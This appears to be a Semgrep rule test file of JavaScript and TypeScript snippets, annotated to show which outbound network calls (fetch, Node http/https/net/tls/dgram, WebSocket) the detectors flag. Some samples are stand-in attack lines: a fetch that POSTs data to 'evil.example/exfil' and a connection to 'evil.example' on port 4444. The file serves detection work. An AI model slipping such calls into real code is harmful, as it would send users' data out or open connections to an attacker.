// ruleid: network-fetch-call
fetch('https://evil.example/exfil', { method: 'POST', body: data });

// ruleid: network-node-module-call
require('http').get('http://example.com');

// ruleid: network-node-module-call
require('node:net').createConnection(opts);

const https1 = require('https');
// ruleid: network-node-module-call
https1.request(opts);

var tls1 = require("tls");
// ruleid: network-node-module-call
tls1.connect(opts);

// TypeScript CommonJS emit for `import { request } from 'https'`
const https_1 = require("https");
// ruleid: network-node-module-call
(0, https_1.request)(opts);

// TypeScript emit for `import http from 'http'` (esModuleInterop)
const http_1 = __importDefault(require("http"));
// ruleid: network-node-module-call
http_1.default.get('http://example.com');

const { createSocket } = require('dgram');
// ruleid: network-node-module-call
createSocket('udp4');

import httpDefault from 'node:http';
// ruleid: network-node-module-call
httpDefault.get('http://example.com');

import * as netNs from 'net';
// ruleid: network-node-module-call
netNs.connect(4444, 'evil.example');

import { request as httpsRequest } from 'https';
// todoruleid: network-node-module-call
httpsRequest(opts);

const notHttp = require('some-http-client-lib');
// ok: network-node-module-call
notHttp.get('http://example.com');

// ruleid: network-websocket-construction
new WebSocket('wss://evil.example');

// ok: network-websocket-construction
new LocalEmitter('wss://evil.example');

// Passed by reference rather than called directly.
const https2 = require('https');
// ruleid: network-node-module-call
const getAsync = util.promisify(https2.get);

const { connect } = require('net');
// ruleid: network-node-module-call
hosts.forEach(connect);
